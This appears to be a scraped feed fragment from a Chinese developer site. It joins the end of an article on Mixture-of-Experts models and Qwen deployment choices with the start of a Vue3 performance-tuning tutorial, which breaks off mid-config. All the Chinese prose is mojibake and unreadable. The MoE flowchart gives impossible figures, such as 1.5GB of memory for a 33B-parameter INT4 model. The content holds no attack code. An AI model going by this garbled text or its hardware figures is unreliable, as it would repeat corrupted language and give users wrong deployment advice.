    A[è¾“å…¥ Token è¡¨ç¤º] --&gt; B[Router å°å‹ç½‘ç»œ&lt;br/&gt;Linear + Softmax]
    B --&gt; C[è¾“å‡ºä¸“å®¶æ¦‚ç‡åˆ†å¸ƒ]
    
    C --&gt; D{Top-K é€‰æ‹©}
    D --&gt; E1[ä¸“å®¶å¾—åˆ†: 0.35]
    D --&gt; E2[ä¸“å®¶å¾—åˆ†: 0.28]
    D --&gt; E3[ä¸“å®¶å¾—åˆ†: 0.15]
    D --&gt; E4[å…¶ä»–ä¸“å®¶...]
    
    E1 --&gt; F[é€‰æ‹© Top-2]
    E2 --&gt; F
    
    F --&gt; G[+ è´Ÿè½½å‡è¡¡æŸå¤±&lt;br/&gt;é˜²æ­¢ä¸“å®¶åå‘]
    
    style G fill:#FFD700
</code></pre>
<p><strong>è®­ç»ƒä¼˜åŒ–ï¼š</strong></p>
<ol>
<li>ä½¿ç”¨ <strong>Softmax + Top-K</strong></li>
<li>åŠ å…¥ <strong>è´Ÿè½½å‡è¡¡ï¼ˆLoad Balancingï¼‰æŸå¤±é¡¹</strong></li>
<li>ç¡®ä¿ä¸“å®¶ä¸ä¼š"åå‘æ€§è¿‡å¼º"</li>
</ol>
<hr/>
<h4 data-id="heading-27">7.3 ä¸“å®¶ç‰¹åŒ–è¿‡ç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[è®­ç»ƒåˆæœŸ&lt;br/&gt;ä¸“å®¶æ— æ˜æ˜¾åˆ†å·¥] --&gt; B[ä¸­æœŸ&lt;br/&gt;é€æ¸å½¢æˆåå¥½]
    B --&gt; C[åæœŸ&lt;br/&gt;ä¸“å®¶ç‰¹åŒ–å®Œæˆ]
    
    subgraph "è®­ç»ƒåˆæœŸ"
        A1[Expert 1&lt;br/&gt;é€šç”¨èƒ½åŠ›]
        A2[Expert 2&lt;br/&gt;é€šç”¨èƒ½åŠ›]
        A3[Expert 3&lt;br/&gt;é€šç”¨èƒ½åŠ›]
    end
    
    subgraph "è®­ç»ƒåæœŸ"
        C1[Expert 1&lt;br/&gt; ä»£ç ä¸“å®¶]
        C2[Expert 2&lt;br/&gt; æ•°å­¦ä¸“å®¶]
        C3[Expert 3&lt;br/&gt; åˆ›æ„ä¸“å®¶]
    end
    
    A1 -.æ¼”åŒ–.-&gt; C1
    A2 -.æ¼”åŒ–.-&gt; C2
    A3 -.æ¼”åŒ–.-&gt; C3
    
    style C1 fill:#90EE90
    style C2 fill:#87CEEB
    style C3 fill:#FFB6C1
</code></pre>
<p><strong>å…³é”®è®­ç»ƒæŠ€æœ¯ï¼š</strong></p>
<ul>
<li><strong>OBST</strong>ï¼ˆOne-Batch Selective Trainingï¼‰</li>
<li><strong>GShard</strong>ï¼ˆGoogleï¼‰</li>
<li><strong>Switch Transformer</strong>ï¼ˆGoogleï¼‰</li>
<li><strong>DeepSpeed-MoE</strong>ï¼ˆå¾®è½¯ï¼‰</li>
</ul>
<hr/>
<h4 data-id="heading-28">7.4 é˜²æ­¢ä¸“å®¶é—²ç½®çš„æœºåˆ¶</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((é˜²æ­¢ä¸“å®¶é—²ç½®))
    è´Ÿè½½å‡è¡¡æŸå¤±
      æƒ©ç½šè¿‡åº¦ä½¿ç”¨æŸä¸ªä¸“å®¶
      å¥–åŠ±ä½¿ç”¨å†·é—¨ä¸“å®¶
    å¤šä»»åŠ¡è®­ç»ƒ
      è¦†ç›–ä¸åŒé¢†åŸŸæ•°æ®
      ç¡®ä¿æ¯ä¸ªä¸“å®¶æœ‰ç”¨æ­¦ä¹‹åœ°
    éšæœºå™ªå£°
      è·¯ç”±å™¨æ·»åŠ éšæœºæ‰°åŠ¨
      å¢åŠ ä¸“å®¶æ¿€æ´»å¤šæ ·æ€§
    Expert Dropout
      è®­ç»ƒæ—¶éšæœºä¸¢å¼ƒä¸“å®¶
      å¼ºåˆ¶å…¶ä»–ä¸“å®¶å­¦ä¹ 
</code></pre>
<p><strong>ç»“æœï¼š</strong> æ‰€æœ‰ä¸“å®¶éƒ½æœ‰æœºä¼šå‚ä¸è®­ç»ƒï¼Œä¸ä¼šå‡ºç°"æ´»è·ƒä¸“å®¶"å’Œ"åƒµå°¸ä¸“å®¶"ã€‚</p>
<hr/>
<h3 data-id="heading-29">8. å®Œæ•´çŸ¥è¯†ä½“ç³»æ€»ç»“</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap
  root((MoEæ ¸å¿ƒçŸ¥è¯†))
    åŸºç¡€æ¦‚å¿µ
      å¤šä¸“å®¶ç»“æ„
      ç¨€ç–æ¿€æ´»
      è·¯ç”±æœºåˆ¶
    å‚æ•°å…³ç³»
      æ€»å‚æ•°ä¸ç­‰æ¨ç†æˆæœ¬
      æ¿€æ´»å‚æ•°å®šæˆæœ¬
      æ˜¾å­˜å ç”¨1/10
    æ¨¡å‹å¯¹æ¯”
      Denseå…¨æ¿€æ´»
      MoEé€‰æ¿€æ´»
      æ€§èƒ½æˆæœ¬æƒè¡¡
    è®­ç»ƒæœºåˆ¶
      è·¯ç”±å™¨è®­ç»ƒ
      ä¸“å®¶ç‰¹åŒ–
      è´Ÿè½½å‡è¡¡
    éƒ¨ç½²æ–¹æ¡ˆ
      æ¶ˆè´¹çº§14B
      ä¸“ä¸šçº§32B
      ä¼ä¸šçº§72B
    ä¼˜åŠ¿
      å¤§æ¨¡å‹èƒ½åŠ›
      å°æ¨¡å‹æˆæœ¬
      é¢†åŸŸç‰¹åŒ–
</code></pre>
<hr/>
<h3 data-id="heading-30">9. åå¥è¯æŒæ¡ MoE</h3>
<ol>
<li><strong>MoE = å¤šä¸“å®¶ç»“æ„ï¼Œæ¯æ¬¡åªæ¿€æ´»å°‘æ•°ä¸“å®¶</strong></li>
<li><strong>æ€»å‚æ•°ï¼ˆå¦‚ 30Bï¼‰â‰  æ¨ç†æˆæœ¬</strong></li>
<li><strong>æ¨ç†æˆæœ¬ â‰ˆ æ¿€æ´»å‚æ•°ï¼ˆå¦‚ 3Bï¼‰</strong></li>
<li><strong>Dense = å…¨éƒ¨æ¿€æ´»ï¼Œæ€§èƒ½å¼ºä½†æˆæœ¬é«˜</strong></li>
<li><strong>MoE = "å¤§æ¨¡å‹èƒ½åŠ› + å°æ¨¡å‹æˆæœ¬"</strong></li>
<li><strong>INT4/FP8 æ˜¯é‡åŒ–æŠ€æœ¯ï¼Œä¸ MoE æ¶æ„æ— å…³</strong></li>
<li><strong>INT4 çœæ˜¾å­˜ä½†ä¼šç•¥é™æ€§èƒ½</strong></li>
<li><strong>MoE ä¸ä¼šæµªè´¹å‚æ•°ï¼Œæœªæ¿€æ´»ä¸“å®¶ä¼šåœ¨å…¶ä»–ä»»åŠ¡ä¸­ä½¿ç”¨</strong></li>
<li><strong>Qwen3-14B Dense FP8 æ˜¯æœ€ç¨³å¥çš„éƒ¨ç½²æ–¹æ¡ˆ</strong></li>
<li><strong>Qwen-MoE ç³»åˆ—é€‚åˆæ˜¾å­˜ 4GB~24GB çš„åœºæ™¯</strong></li>
</ol>
<hr/>
<h3 data-id="heading-31">10. ä¸ªäººå¿«é€Ÿå†³ç­–æŒ‡å—</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start[å¼€å§‹é€‰æ‹©æ¨¡å‹] --&gt; Q1{ä½ çš„æ˜¾å­˜?}
    
    Q1 --&gt;|4-8GB| A1[Qwen1.5-MoE-33B INT4&lt;br/&gt;æ˜¾å­˜: 1.5GB&lt;br/&gt;æ€§èƒ½: ä¸­ä¸Š]
    Q1 --&gt;|12-16GB| A2[Qwen3-7B Dense FP8&lt;br/&gt;æ˜¾å­˜: 7GB&lt;br/&gt;æ€§èƒ½: ä¸­]
    Q1 --&gt;|20-24GB| A3{ä¼˜å…ˆä»€ä¹ˆ?}
    Q1 --&gt;|40GB+| A4[Qwen3-32B Dense FP8&lt;br/&gt;æ˜¾å­˜: 30GB&lt;br/&gt;æ€§èƒ½: æå¼º]
    Q1 --&gt;|80GB+| A5[Qwen3-72B Dense FP8&lt;br/&gt;æ˜¾å­˜: 72GB&lt;br/&gt;æ€§èƒ½: é¡¶çº§]
    
    A3 --&gt;|æ€§èƒ½| B1[Qwen3-14B Dense FP8&lt;br/&gt;æ˜¾å­˜: 14GB&lt;br/&gt;æ€§èƒ½: å¼º]
    A3 --&gt;|å…¼é¡¾| B2[Qwen3-14B Dense INT4&lt;br/&gt;æ˜¾å­˜: 7GB&lt;br/&gt;æ€§èƒ½: å¼º]
    
    style A1 fill:#87CEEB
    style B1 fill:#90EE90
    style A4 fill:#FFD700
    style A5 fill:#FF6B6B
</code></pre>
<hr/>
<h3 data-id="heading-32">é™„å½•ï¼šå‚è€ƒèµ„æº</h3>
<p><strong>å®˜æ–¹æ–‡æ¡£ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fqwen.readthedocs.io%2F" target="_blank" title="https://qwen.readthedocs.io/" ref="nofollow noopener noreferrer">Qwen å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2FQwen" target="_blank" title="https://huggingface.co/Qwen" ref="nofollow noopener noreferrer">Hugging Face Model Hub</a></li>
</ul>
<p><strong>éƒ¨ç½²å·¥å…·ï¼š</strong></p>
<ul>
<li>vLLM</li>
<li>Ollama</li>
<li>llama.cpp</li>
</ul>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼šä»10ç§’åˆ°1ç§’çš„5ä¸ªå…³é”®æŠ€å·§ï¼Œè®©ä½ çš„åº”ç”¨é£èµ·æ¥ï¼]]></title>    <link>https://juejin.cn/post/7582533464244469794</link>    <guid>https://juejin.cn/post/7582533464244469794</guid>    <pubDate>2025-12-12T04:17:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582533464244469794" data-draft-id="7582517824498024482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼šä»10ç§’åˆ°1ç§’çš„5ä¸ªå…³é”®æŠ€å·§ï¼Œè®©ä½ çš„åº”ç”¨é£èµ·æ¥ï¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-12T04:17:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼šä»10ç§’åˆ°1ç§’çš„5ä¸ªå…³é”®æŠ€å·§ï¼Œè®©ä½ çš„åº”ç”¨é£èµ·æ¥ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T04:17:03.000Z" title="Fri Dec 12 2025 04:17:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue3 æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼šä»10ç§’åˆ°1ç§’çš„5ä¸ªå…³é”®æŠ€å·§ï¼Œè®©ä½ çš„åº”ç”¨é£èµ·æ¥ï¼</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>åœ¨å½“ä»Šçš„å‰ç«¯å¼€å‘ä¸­ï¼Œæ€§èƒ½ä¼˜åŒ–æ˜¯æ¯ä¸ªå¼€å‘è€…éƒ½æ— æ³•å›é¿çš„è¯é¢˜ã€‚å°¤å…¶æ˜¯å¯¹äº Vue3 åº”ç”¨æ¥è¯´ï¼Œéšç€ä¸šåŠ¡é€»è¾‘çš„å¤æ‚åŒ–å’Œæ•°æ®é‡çš„å¢é•¿ï¼Œåº”ç”¨çš„æ€§èƒ½é—®é¢˜å¯èƒ½ä¼šé€æ¸æ˜¾ç°ã€‚ä¸€ä¸ªåŸæœ¬å“åº”è¿…é€Ÿçš„é¡µé¢ï¼Œå¯èƒ½åœ¨æŸä¸ªæ—¶åˆ»å˜å¾—ç¼“æ…¢ç”šè‡³å¡é¡¿ï¼Œä¸¥é‡å½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
<p>æœ¬æ–‡å°†ä»å®æˆ˜è§’åº¦å‡ºå‘ï¼Œåˆ†äº« 5 ä¸ªå…³é”®çš„ Vue3 æ€§èƒ½ä¼˜åŒ–æŠ€å·§ï¼Œå¸®åŠ©ä½ ä»â€œ10ç§’åŠ è½½â€ä¼˜åŒ–åˆ°â€œ1ç§’å“åº”â€ï¼Œè®©ä½ çš„åº”ç”¨çœŸæ­£â€œé£èµ·æ¥â€ã€‚è¿™äº›æŠ€å·§ä¸ä»…åŸºäº Vue3 çš„æ ¸å¿ƒç‰¹æ€§ï¼ˆå¦‚ Composition APIã€å“åº”å¼ç³»ç»Ÿä¼˜åŒ–ç­‰ï¼‰ï¼Œè¿˜ç»“åˆäº†ç°ä»£å‰ç«¯å·¥ç¨‹åŒ–çš„æœ€ä½³å®è·µã€‚</p>
<hr/>
<h3 data-id="heading-2">1. <strong>åˆç†ä½¿ç”¨ <code>v-once</code> å’Œ <code>v-memo</code>ï¼šå‡å°‘ä¸å¿…è¦çš„æ¸²æŸ“</strong></h3>
<p>Vue3 çš„å“åº”å¼ç³»ç»Ÿæ˜¯å…¶æ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€ï¼Œä½†é¢‘ç¹çš„ç»„ä»¶æ¸²æŸ“ä¹Ÿå¯èƒ½æˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚<code>v-once</code> å’Œ <code>v-memo</code> æ˜¯ä¸¤ä¸ªç”¨äºä¼˜åŒ–æ¸²æŸ“çš„æŒ‡ä»¤ï¼š</p>
<ul>
<li>
<p><strong><code>v-once</code></strong>ï¼šæ ‡è®°å…ƒç´ æˆ–ç»„ä»¶åªæ¸²æŸ“ä¸€æ¬¡ï¼Œåç»­ä¸å†æ›´æ–°ã€‚é€‚ç”¨äºé™æ€å†…å®¹æˆ–ä¸éœ€è¦å“åº”å¼å˜åŒ–çš„éƒ¨åˆ†ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-once</span>&gt;</span>{{ staticContent }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong><code>v-memo</code></strong>ï¼ˆVue3.2+ï¼‰ï¼šé€šè¿‡ç¼“å­˜è™šæ‹Ÿ DOM èŠ‚ç‚¹ï¼Œé¿å…ä¸å¿…è¦çš„é‡æ–°æ¸²æŸ“ã€‚é€‚ç”¨äºéœ€è¦é¢‘ç¹æ›´æ–°ä½†å†…å®¹å¯èƒ½ä¸å˜çš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-memo</span>=<span class="hljs-string">"[dependency]"</span>&gt;</span>{{ dynamicContent }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>åªæœ‰å½“ <code>dependency</code> å˜åŒ–æ—¶ï¼Œæ‰ä¼šè§¦å‘é‡æ–°æ¸²æŸ“ã€‚</p>
</li>
</ul>
<h4 data-id="heading-3"><strong>å®æˆ˜å»ºè®®</strong></h4>
<ul>
<li>å¯¹é™æ€å†…å®¹ï¼ˆå¦‚é¡µè„šã€æ ‡é¢˜ï¼‰ä½¿ç”¨ <code>v-once</code>ã€‚</li>
<li>å¯¹é«˜é¢‘æ›´æ–°ä½†ä¾èµ–é¡¹è¾ƒå°‘çš„åˆ—è¡¨é¡¹ä½¿ç”¨ <code>v-memo</code>ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-4">2. <strong>æ‡’åŠ è½½ä¸ä»£ç åˆ†å‰²ï¼šæŒ‰éœ€åŠ è½½èµ„æº</strong></h3>
<p>Vue3 ç»“åˆç°ä»£æ‰“åŒ…å·¥å…·ï¼ˆå¦‚ Viteã€Webpackï¼‰å¯ä»¥è½»æ¾å®ç°ä»£ç åˆ†å‰²å’Œæ‡’åŠ è½½ï¼š</p>
<ul>
<li>
<p><strong>è·¯ç”±çº§æ‡’åŠ è½½</strong>ï¼šé€šè¿‡åŠ¨æ€å¯¼å…¥æ‹†åˆ†è·¯ç”±ç»„ä»¶ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Home</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">'./views/Home.vue'</span>);
</code></pre>
</li>
<li>
<p><strong>ç»„ä»¶çº§æ‡’åŠ è½½</strong>ï¼šå¯¹éé¦–å±å…³é”®ç»„ä»¶ä½¿ç”¨ <code>defineAsyncComponent</code>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineAsyncComponent } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncComponent</span> = <span class="hljs-title function_">defineAsyncComponent</span>(<span class="hljs-function">() =&gt;</span> 
  <span class="hljs-keyword">import</span>(<span class="hljs-string">'./components/HeavyComponent.vue'</span>)
);
</code></pre>
</li>
</ul>
<h4 data-id="heading-5"><strong>å®æˆ˜å»ºè®®</strong></h4>
<ul>
<li>ç»“åˆ <code>Suspense</code>ï¼ˆå®éªŒæ€§ç‰¹æ€§ï¼‰å¤„ç†å¼‚æ­¥ç»„ä»¶çš„åŠ è½½çŠ¶æ€ã€‚</li>
<li>Vite + Rollup çš„å¤©ç„¶æ”¯æŒå¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ– Tree Shakingã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">3. <strong>å“åº”å¼æ•°æ®çš„ç²¾ç»†åŒ–æ§åˆ¶</strong></h3>
<p>Vue3 çš„å“åº”å¼ç³»ç»ŸåŸºäº Proxyï¼Œä½†ä»éœ€é¿å…è¿‡åº¦å“åº”å¼åŒ–ï¼š</p>
<ul>
<li><strong>ä½¿ç”¨ <code>shallowRef</code> / <code>shallowReactive</code></strong>ï¼šä»…å¯¹é¡¶å±‚å±æ€§è¿›è¡Œå“åº”å¼å¤„ç†ï¼Œé€‚åˆå¤§å‹å¯¹è±¡æˆ–æ•°ç»„ã€‚</li>
<li><strong>é¿å…åœ¨æ¨¡æ¿ä¸­ç›´æ¥è®¿é—®æ·±å±‚åµŒå¥—å±æ€§</strong>ï¼šä¾‹å¦‚ <code>user.profile.address.city</code>ï¼Œè¿™ç§è®¿é—®ä¼šé€’å½’è§¦å‘ä¾èµ–æ”¶é›†ã€‚</li>
<li><strong>æ‰‹åŠ¨æ§åˆ¶ä¾èµ–è¿½è¸ª</strong>ï¼šé€šè¿‡ <code>markRaw</code> è·³è¿‡ä¸å¿…è¦çš„å“åº”å¼è½¬æ¢ã€‚</li>
</ul>
<h4 data-id="heading-7"><strong>å®æˆ˜å»ºè®®</strong></h4>
<ul>
<li>APIè¿”å›çš„å¤§å‹æ•°æ®é›†ä¼˜å…ˆç”¨ <code>shallowRef</code>ã€‚</li>
<li>Pinia/VuexçŠ¶æ€ç®¡ç†ä¸­å¯å±€éƒ¨ä½¿ç”¨éå“åº”å¼æ•°æ®ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-8">4. <strong>è™šæ‹Ÿæ»šåŠ¨ä¸åˆ—è¡¨ä¼˜åŒ–ï¼šé«˜æ•ˆæ¸²æŸ“é•¿åˆ—è¡¨</strong></h3>
<p>é•¿åˆ—è¡¨æ˜¯å‰ç«¯æ€§èƒ½çš„â€œæ€æ‰‹â€ã€‚Vue3ç”Ÿæ€æä¾›äº†æˆç†Ÿçš„è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li><strong>è™šæ‹Ÿæ»šåŠ¨åº“ï¼ˆå¦‚ <code>vue-virtual-scroller</code>ï¼‰</strong>ï¼šä»…æ¸²æŸ“å¯è§†åŒºåŸŸçš„ DOMã€‚</li>
<li><strong>æ‰‹åŠ¨å®ç°åˆ†ç‰‡æ¸²æŸ“ï¼ˆTime Slicingï¼‰</strong>ï¼šé€šè¿‡ <code>requestIdleCallback</code>åˆ†æ‰¹æ¸²æŸ“æ•°æ®ã€‚</li>
</ul>
<h4 data-id="heading-9"><strong>ç¤ºä¾‹ä»£ç ï¼ˆè™šæ‹Ÿæ»šåŠ¨ï¼‰</strong></h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">RecycleScroller</span> 
    <span class="hljs-attr">:items</span>=<span class="hljs-string">"largeList"</span>
    <span class="hljs-attr">:item-size</span>=<span class="hljs-string">"50"</span>
    <span class="hljs-attr">key-field</span>=<span class="hljs-string">"id"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">default</span>=<span class="hljs-string">"{ item }"</span>&gt;</span>
      {{ item.name }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">RecycleScroller</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<h4 data-id="heading-10"><strong>å®æˆ˜å»ºè®®</strong></h4>
<ul>
<li>1ä¸‡æ¡ä»¥ä¸Šæ•°æ®å¿…é¡»ç”¨è™šæ‹Ÿæ»šåŠ¨ã€‚</li>
<li>ç»“åˆWeb Workeré¢„å¤„ç†æ•°æ®è¿›ä¸€æ­¥é™ä½ä¸»çº¿ç¨‹å‹åŠ›ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-11">5. <strong>ç¼–è¯‘æ—¶ä¼˜åŒ–ä¸å·¥å…·é“¾é€‰æ‹©</strong></h3>
<p>Vue3çš„ç¼–è¯‘å™¨åšäº†å¤§é‡é™æ€åˆ†æä¼˜åŒ–ï¼š</p>
<ol>
<li><strong>å¯ç”¨æ¨¡æ¿é¢„ç¼–è¯‘ï¼ˆViteæ¨¡å¼é»˜è®¤å¼€å¯ï¼‰</strong></li>
<li><strong>é€‰æ‹©æ€§ç¦ç”¨SourceMapç”Ÿæˆ</strong></li>
<li><strong>é™æ€èŠ‚ç‚¹æå‡ï¼ˆHoist Staticï¼‰</strong></li>
<li><strong>Patch Flagsæ ‡è®°åŠ¨æ€èŠ‚ç‚¹</strong></li>
</ol>
<h4 data-id="heading-12">Viteé…ç½®ç¤ºä¾‹ï¼š</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
